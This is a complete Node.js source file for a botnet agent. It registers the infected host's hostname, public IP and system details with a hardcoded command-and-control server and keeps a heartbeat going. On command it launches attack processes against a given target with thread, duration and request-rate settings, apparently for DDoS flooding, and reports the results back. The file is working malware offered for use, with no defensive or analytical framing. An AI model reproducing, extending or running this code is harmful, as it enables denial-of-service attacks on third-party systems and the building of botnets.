#!/usr/bin/env node

/**
 * 🤖 SIMPLE BOT AGENT - Single File Edition
 * Standalone bot agent untuk C2 server
 * 
 * Usage: node simple-bot.js <C2_URL>
 * Example: node simple-bot.js https://your-c2-server.com
 */

import axios from 'axios';
import { io } from 'socket.io-client';
import os from 'os';
import crypto from 'crypto';
import { spawn } from 'child_process';

// ============================================
// CONFIGURATION
// ============================================
const C2_URL = process.argv[2] || 'https://super-duper-waddle-4jwqw567q4x925jj6-8080.app.github.dev';
const API_KEY = 'aryzz-c2-api-key-2024';
const BOT_ID = crypto.randomUUID();
const RECONNECT_INTERVAL = 5000;
const HEARTBEAT_INTERVAL = 30000;

// ============================================
// COLORS FOR CONSOLE
// ============================================
const colors = {
    reset: '\x1b[0m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m'
};

function log(msg, color = 'reset') {
    const timestamp = new Date().toLocaleTimeString();
    console.log(`${colors[color]}[${timestamp}] ${msg}${colors.reset}`);
}

// ============================================
// GET PUBLIC IP
// ============================================
async function getPublicIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
        return response.data.ip;
    } catch (error) {
        return '0.0.0.0';
    }
}

// ============================================
// REGISTER BOT
// ============================================
async function registerBot() {
    const botInfo = {
        id: BOT_ID,
        hostname: os.hostname(),
        ip: await getPublicIP(),
        os: `${os.type()} ${os.release()}`,
        arch: os.arch(),
        cpus: os.cpus().length,
        memory: Math.round(os.totalmem() / 1024 / 1024 / 1024),
        version: '1.0.0'
    };

    try {
        const response = await axios.post(
            `${C2_URL}/api/bot/register`,
            botInfo,
            {
                headers: { 'Content-Type': 'application/json' },
                timeout: 10000
            }
        );

        if (response.data.success) {
            log(`✅ Bot registered: ${BOT_ID}`, 'green');
            log(`   Hostname: ${botInfo.hostname}`, 'cyan');
            log(`   IP: ${botInfo.ip}`, 'cyan');
            return true;
        }
    } catch (error) {
        log(`❌ Registration failed: ${error.message}`, 'red');
        return false;
    }
}

// ============================================
// EXECUTE ATTACK
// ============================================
const activeAttacks = new Map();

async function executeAttack(task) {
    const { id, command } = task;
    const { target, method, threads, duration, rpc } = command;

    log(`⚡ Starting attack: ${method} -> ${target}`, 'yellow');
    log(`   Threads: ${threads}, Duration: ${duration}s, RPC: ${rpc}`, 'cyan');

    try {
        // Spawn attack process using main bot
        const attackProcess = spawn('node', [
            'index.js',
            'attack',
            '--target', target,
            '--method', method,
            '--threads', threads.toString(),
            '--duration', duration.toString(),
            '--rpc', rpc.toString()
        ], {
            cwd: process.cwd(),
            stdio: 'pipe'
        });

        activeAttacks.set(id, attackProcess);

        // Handle output
        attackProcess.stdout.on('data', (data) => {
            log(`[Attack ${id.substring(0, 8)}] ${data.toString().trim()}`, 'blue');
        });

        attackProcess.stderr.on('data', (data) => {
            log(`[Attack ${id.substring(0, 8)}] ERROR: ${data.toString().trim()}`, 'red');
        });

        // Handle completion
        attackProcess.on('close', (code) => {
            activeAttacks.delete(id);
            log(`✅ Attack ${id.substring(0, 8)} completed (code: ${code})`, 'green');
            
            // Report completion to C2
            reportCompletion(id, { success: code === 0 });
        });

    } catch (error) {
        log(`❌ Failed to start attack: ${error.message}`, 'red');
        reportCompletion(id, { success: false, error: error.message });
    }
}

// ============================================
// STOP ATTACK
// ============================================
function stopAttack(taskId) {
    const attackProcess = activeAttacks.get(taskId);
    if (attackProcess) {
        attackProcess.kill('SIGTERM');
        activeAttacks.delete(taskId);
        log(`⚠️  Attack ${taskId.substring(0, 8)} stopped`, 'yellow');
    }
}

// ============================================
// REPORT COMPLETION
// ============================================
async function reportCompletion(taskId, result) {
    try {
        await axios.post(
            `${C2_URL}/api/task/${taskId}/complete`,
            result,
            {
                headers: { 'Content-Type': 'application/json' },
                timeout: 5000
            }
        );
    } catch (error) {
        log(`Failed to report completion: ${error.message}`, 'red');
    }
}

// ============================================
// SEND HEARTBEAT
// ============================================
async function sendHeartbeat() {
    try {
        const stats = {
            cpu: os.loadavg()[0],
            memory: {
                total: os.totalmem(),
                free: os.freemem(),
                used: os.totalmem() - os.freemem()
            },
            uptime: os.uptime(),
            activeAttacks: activeAttacks.size
        };

        await axios.post(
            `${C2_URL}/api/bot/${BOT_ID}/heartbeat`,
            { stats },
            {
                headers: { 'Content-Type': 'application/json' },
                timeout: 5000
            }
        );
    } catch (error) {
        // Silent fail for heartbeat
    }
}

// ============================================
// WEBSOCKET CONNECTION
// ============================================
let socket = null;
let heartbeatTimer = null;

function connectWebSocket() {
    log(`🔌 Connecting to C2: ${C2_URL}`, 'cyan');

    socket = io(C2_URL, {
        transports: ['websocket'],
        reconnection: true,
        reconnectionDelay: RECONNECT_INTERVAL
    });

    socket.on('connect', () => {
        log('✅ WebSocket connected', 'green');
        
        // Authenticate
        socket.emit('bot:connect', {
            botId: BOT_ID,
            apiKey: API_KEY
        });
    });

    socket.on('connected', (data) => {
        if (data.success) {
            log('✅ Authenticated with C2 server', 'green');
            
            // Start heartbeat
            if (heartbeatTimer) clearInterval(heartbeatTimer);
            heartbeatTimer = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
        }
    });

    socket.on('task:new', async (task) => {
        log(`📥 New task received: ${task.id}`, 'magenta');
        
        if (task.type === 'attack' && task.command.action === 'start_attack') {
            await executeAttack(task);
        }
    });

    socket.on('task:stop', (data) => {
        log(`⚠️  Stop task: ${data.taskId}`, 'yellow');
        stopAttack(data.taskId);
    });

    socket.on('disconnect', () => {
        log('🔌 WebSocket disconnected', 'yellow');
    });

    socket.on('error', (error) => {
        log(`WebSocket error: ${error}`, 'red');
    });
}

// ============================================
// MAIN
// ============================================
async function main() {
    console.log(`
╔═══════════════════════════════════════════════════════════╗
║           🤖 SIMPLE BOT AGENT - Single File 🤖           ║
╚═══════════════════════════════════════════════════════════╝
`);

    log(`Bot ID: ${BOT_ID}`, 'cyan');
    log(`C2 URL: ${C2_URL}`, 'cyan');
    log('', 'reset');

    // Register bot
    const registered = await registerBot();
    if (!registered) {
        log('Retrying in 5 seconds...', 'yellow');
        setTimeout(main, 5000);
        return;
    }

    // Connect WebSocket
    connectWebSocket();
}

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
process.on('SIGINT', () => {
    log('\n⚠️  Shutting down bot agent...', 'yellow');
    
    // Stop all attacks
    for (const [taskId, attackProcess] of activeAttacks) {
        attackProcess.kill('SIGTERM');
    }
    
    // Clear heartbeat
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    
    // Disconnect socket
    if (socket) socket.disconnect();
    
    log('✅ Bot agent stopped', 'green');
    process.exit(0);
});

// Start bot
main().catch(error => {
    log(`Fatal error: ${error.message}`, 'red');
    process.exit(1);
});
